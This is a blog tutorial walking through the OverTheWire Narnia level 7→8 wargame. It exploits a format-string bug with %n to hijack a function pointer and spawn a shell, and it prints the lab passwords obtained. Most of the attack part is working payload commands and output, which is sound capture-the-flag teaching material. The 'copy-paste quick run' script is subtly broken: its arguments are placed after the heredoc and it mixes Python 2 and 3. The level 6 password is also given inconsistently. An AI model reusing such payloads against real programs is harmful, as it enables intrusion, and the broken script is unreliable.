---
date: 2023-08-25 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 7 → 8 tutorial!!"
permalink: /posts/Over-The-Wire-Narnia-Level-7-to-8/
tags: [overthewire, narnia, pwn, binary-exploitation, format-string, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 7 → 8!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-6-to-7/' | relative_url }}">← Previous: Level 6 → 7</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia8.html" target="_blank" rel="noopener">Official (Level 8) ↗</a>
  </div>

  <div class="nav-right">
    <a class="disabled" aria-disabled="true">Next: Level 8 → 9 →</a>
  </div>
</nav>

## Login

Use the password you got from **Level 6 → 7** (in my run it was `akhiaziphU`).

```bash
ssh narnia7@narnia.labs.overthewire.org -p 2226
# password: akhiaziphu
```

---

## Task

There’s a single binary **`/narnia/narnia7`** and its source. The program prints two function addresses (`goodfunction` and `hackedfunction`), then **formats our input with `snprintf`**, and finally **calls a function pointer `ptrf`**.

Goal: **redirect execution to `hackedfunction()`** (which sets SUID and spawns `/bin/sh`).

---

## A little bit of Theory

* **Format string vuln**: using `printf`-family with a user-controlled *format string* (no `"%s"` around it) allows write primitives via `%n`.
* **`%n`** stores the number of bytes printed so far **into the address** passed as the corresponding argument.
* **Positional form** `%<index>$n` tells `printf` which *argument slot* to use (1st, 2nd, …) when many things are on the stack.
* We’ll:

  1. Put the **address of `ptrf`** (where the function pointer lives) **into our input** so it sits on the stack,
  2. Pad the output with enough characters so that the byte count equals the **address of `hackedfunction`**,
  3. Use `%<k>$n` to write that count **into `ptrf`**, thus overwriting it with `hackedfunction`’s address.

**Further reading**

* “Format String Exploitation” by scut (classic paper)
* `man 3 printf` (see `%n` and positional parameters)
* Shellcoders Handbook — format strings chapter

---

## Recon

Run the program once:

```bash
cd /narnia
./narnia7 ABCD
```

Example output (addresses differ per box snapshot):

```
goodfunction()  = 0x080486ff
hackedfunction()= 0x08048724

before : ptrf() = 0x080486ff (0xffffd638)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

Key facts we now have:

* **`hackedfunction` = `0x08048724`**
* **`ptrf` is stored at stack address e.g. `0xffffd638`** (the number in parentheses)

---

## Plan

We want to **write `0x08048724` into `*(void**)0xffffd638`**.

`snprintf` counts how many characters it has printed so far. Our payload will:

1. Begin with the raw little-endian **address of `ptrf`** (so it becomes an argument on the stack).
2. Print a huge **padding** so that the total printed length equals **`0x08048724`** (or the same value minus any already-printed bytes).
3. Use **`%<k>$n`** to write that count into the **k-th** argument (the slot where our address sits).

In my run, 4 bytes have already been “consumed” before the `%n` write, so I used:

```
134514464 = 0x08048720 = 0x08048724 - 4
```

We also have to find the **right positional index**. If `%1$n` crashes, try `%2$n`, `%3$n`, …

---

## Exploit

### 1) Try with `%1$n` (often wrong)

```bash
./narnia7 $(python -c 'print "\x38\xD6\xFF\xFF" + "%134514464d%1$n"')
# Segmentation fault → our address is not at slot #1
```

### 2) Use `%2$n` (worked in my session)

```bash
./narnia7 $(python -c 'print "\x38\xD6\xFF\xFF" + "%134514464d%2$n"')
```

If it succeeds you’ll see the “Way to go!!!!” from `hackedfunction()` and then get a shell:

```bash
whoami
# narnia8
cat /etc/narnia_pass/narnia8
# mohthuphog   ← (this was my password; yours may differ)
```

---

## Why `%2$n`?

On this binary the first stack slot consumed by the format machinery isn’t our injected address. The **second** slot is our `0xffffd638`, so `%2$n` hits the correct pointer. If it didn’t, we’d continue brute-forcing (`%3$n`, `%4$n`, …).
You can verify indexes by sprinkling `%x`/`%p` to dump the stack, then counting.

---

## Troubleshooting

* **Segfault immediately** → Wrong positional index. Try `%2$n`, `%3$n`, … up to \~10.
* **No shell / still goodfunction()** → Padding count is off. Recalculate:

  * Target count: **`0x08048724`** → decimal **134514468**.
  * Subtract the number of already printed bytes before `%n`. If you begin with the raw 4-byte address, **subtract 4** → **134514464**.
* **Garbage from your shell** → Your terminal ate backslashes. Always use Python to emit **raw bytes** as shown.
* **Addresses differ** → Use the addresses your binary prints (do not copy mine verbatim).

---

## Copy-paste quick run

```bash
cd /narnia

# Replace 0xffffd638 with the 'ptrf' stack address printed by your run
PTRF=$(/narnia/narnia7 test 2>/dev/null | awk '/before : ptrf/ {gsub(/[()]/,""); print $6}')

# Compute padding (target 0x08048724 minus 4)
PAD=134514464

# Try positional slots 1..5 until one works
for k in 1 2 3 4 5; do
  echo "[*] Trying index %${k}\$n at ptr=${PTRF}..."
  /narnia/narnia7 "$(python - <<PY
import sys
ptr = int(sys.argv[1],16)
pad = int(sys.argv[2])
sys.stdout.write(ptr.to_bytes(4,'little'))
sys.stdout.write("%%%dd%%%d\$n" % (pad, int(sys.argv[3])))
PY
"$PTRF" "$PAD" "$k")" && break
done

whoami
cat /etc/narnia_pass/narnia8
```

---

## Password

> From my run, the password for **narnia8** was:

```
mohthuphog
```

(Use the one your box prints.)

---

**Congrats 🎉** You just turned a **format-string** bug into a **write-what-where** to hijack a function pointer and win a shell. See you in **Level 8 → 9**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
